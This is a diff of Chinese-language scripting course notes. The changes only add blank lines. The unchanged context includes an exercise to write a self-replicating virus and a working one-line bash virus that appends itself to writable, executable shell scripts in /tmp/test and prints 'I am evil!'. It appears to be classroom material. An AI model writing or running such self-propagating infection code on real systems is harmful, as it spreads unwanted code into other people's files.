@@ -1381,20 +1381,27 @@ s.close()
 ```
 
 ## python 脚本实战
+
 ### for循环9*9
+
 ### 自定义模块，加载模式，使用模块的方法，数据（__name__）
+
 ### 使用subprocess模块完成病毒自我复制
+
 ### 使用subprocess模块完成批量添加用户
+
 ### 虚拟环境的搭建，激活和退出；第三方包的安装
 ---
 
 病毒：（bash、python）
+
 1. 判断当前病毒是否已经在运行，如果是，那么我就不再运行
 2. 病毒感染对象为bash|python脚本(file )(Python script|Bourne-Again shell script)
 3. 可执行的可写的[ -w file -a -x file ]
 4. 感染病毒的脚本执行的时候会额外输出"I am evil！"
 5. 病毒能够自我复制
 6. 如果已经被感染，就不再感染
+
 ```shell
 #!/bin/bash
 if [ ! -f /tmp/.mybblock ];then touch /tmp/.mybblock; for i in `find /tmp/test/*` ; do grep "mybblock" $i &> /dev/null && continue ; file $i | grep "Bourne-Again shell script" &> /dev/null || continue ; [ -x $i -a -w $i ] || continue ; tail -n 1 $0 >> $i; done ; echo "hello,I am evil!"; rm -rf /tmp/.mybblock &> /dev/null ; fi
